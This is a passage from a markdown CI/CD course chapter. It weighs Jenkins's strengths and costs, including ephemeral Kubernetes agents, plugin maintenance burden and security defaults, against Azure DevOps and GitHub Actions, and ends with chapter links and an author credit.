  □ 3.2 the shared library — contract test, breaking-change detector, version inventory
  □ 3.3 approval + mutex + gate — 8 paths exercised, the timeout proven safe
  □ 3.4 hardening — the audit diffed before/after, all 40 jobs build-verified
  □ 3.5 the freestyle migration — history archived, and 3 silently-broken jobs found
```

---

## What Jenkins gave me, and what it cost me

**Gave me:**
```
⭐ Total control. Every behaviour is a plugin or a Groovy function. If you can
   describe it, you can build it — including things the SaaS tools simply don't do
   (a custom approval flow that queries your CMDB, a build that provisions its
   own test cluster and tears it down, a promotion pipeline driven by a database).
⭐⭐ Ephemeral Kubernetes pod agents are genuinely excellent. A fresh, isolated,
   multi-container pod per build, destroyed on completion, scaled to zero when
   idle, with per-template resource limits and node selectors. This is the best
   agent model of the three tools.
⭐ A shared library is a REAL programming model — classes, inheritance, unit
   tests, versioned releases, a contract. Groovy is a full JVM language; you are
   not fighting a YAML schema.
⭐ Cost. Zero licence fees, and the agents are your own (possibly already-paid-for)
   Kubernetes capacity. At high volume this is dramatically cheaper than per-minute
   billing.
⭐ `input` + Lockable Resources + milestone compose into approval flows more
   expressive than either SaaS tool's gates — including an approver supplying
   structured data (a ticket ID) that you then validate.
⭐ It runs ANYWHERE. On-prem, air-gapped, behind a firewall, on a $5 VPS, on a
   mainframe-adjacent network. No vendor reachability requirement.
⭐ Multibranch + `changeRequest()` + `trustNobody()` is a mature, well-understood
   PR pipeline model that has been hardened for a decade.
⭐ The ecosystem of plugins covers tools nothing else integrates with: mainframe,
   SAP, embedded toolchains, proprietary test harnesses, hardware-in-the-loop rigs.
⭐ Build history is yours, in your storage, forever. No retention tier to buy.
```

**Cost me:**
```
⛔⛔ YOU ARE THE PLATFORM TEAM. Every CVE in every plugin is your problem.
   300 plugins means 300 supply chains. Upgrades are a project, not a button.
   Budget 0.2–0.5 FTE. This is the real cost, and it's the one people forget.
⛔ Groovy's CPS transformation. The NotSerializableException, the closure-capture
   bug in `for` loops, the "method calls not allowed outside script", the
   `@NonCPS` discipline. It is a genuinely hard programming model to learn, and
   the errors are cryptic.
⛔ The Script Approval queue. The sandbox is right to block things, but the
   workflow of "hit a wall, go to the UI, approve a method globally" is bad, and
   approving globally grants it to every pipeline in the instance.
⛔ Nothing is safe by default. numExecutors=0, authorize-project, trustNobody(),
   Agent→Controller access control, folder-scoped credentials, CSRF, no Docker
   socket — you must KNOW to set all seven. GitHub Actions and Azure DevOps get
   several of these right out of the box.
⛔ The UI is 20 years of accumulated layers. Freestyle, Pipeline, Multibranch,
   Folder, Blue Ocean, Pipeline Graph View, the classic view — six ways to see
   the same thing, none of them great.
⛔ No native artifact registry, no native issue tracker, no native code hosting,
   no native dependency scanning, no native SBOM. You assemble all of it.
⛔ The OIDC story is DIY: fetch the token with curl, choose the audience, destroy
   the file yourself. No maintained `configure-aws-credentials` equivalent.
⛔ No HA. One JVM, one JENKINS_HOME. Kubernetes restarts it in 2–5 minutes, and
   that is the ceiling.
⛔ A Jenkinsfile for the same outcome is 2–4× longer than the GitHub Actions YAML
   and 1.5–2× the Azure DevOps YAML, and it's harder to read in a PR diff.
⛔ Debugging a stuck build means the thread dump, the Script Console and the
   `_diag` logs — not a nicely rendered per-step timing chart.
```

**When I'd choose it again:** you need something the SaaS tools can't do (on-prem, air-gapped, exotic hardware, a genuinely custom promotion flow); you already have Kubernetes capacity and a platform team; or you're inheriting an estate and the migration cost exceeds the running cost.

**When I wouldn't:** a small team that just wants PR checks and a deploy. You will spend more time maintaining Jenkins than building your product. Use GitHub Actions.

**The honest summary of all three:**

| | The model | The best thing | The worst thing |
|---|---|---|---|
| **Azure DevOps** | an integrated ALM platform | ⭐ Environments with six kinds of platform-enforced checks | Three expression syntaxes evaluated at three different times |
| **GitHub Actions** | a marketplace-native CI attached to your code | ⭐⭐ OIDC federation — zero secrets, three lines | ⛔ The two unique attacks (`pwn request`, artifact poisoning) and the permissions model |
| **Jenkins** | a programmable automation server | ⭐⭐ Ephemeral Kubernetes pod agents + a real programming model for reuse | ⛔ You are the platform team; nothing is safe by default |

---

## Where next

| You want | Go to |
|---|---|
| 🔷 The same app through Azure DevOps | [02-CASE-1-azure-devops.md](./02-CASE-1-azure-devops.md) |
| 🐙 The same app through GitHub Actions | [03-CASE-2-github-actions.md](./03-CASE-2-github-actions.md) |
| 🏆 All three + GitOps + progressive delivery + 5 capstone tasks | [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) |
| ⚡ Everything on one page | [06-CHEATSHEET.md](./06-CHEATSHEET.md) |
| 📖 The theory (supply chain, pipeline security, branching) | [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) |
| ⏱️ The hour-by-hour plan | [00-ONE-DAY-MASTER-PLAN.md](./00-ONE-DAY-MASTER-PLAN.md) |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*Built for engineers who learn by breaking things on purpose.*

</div>
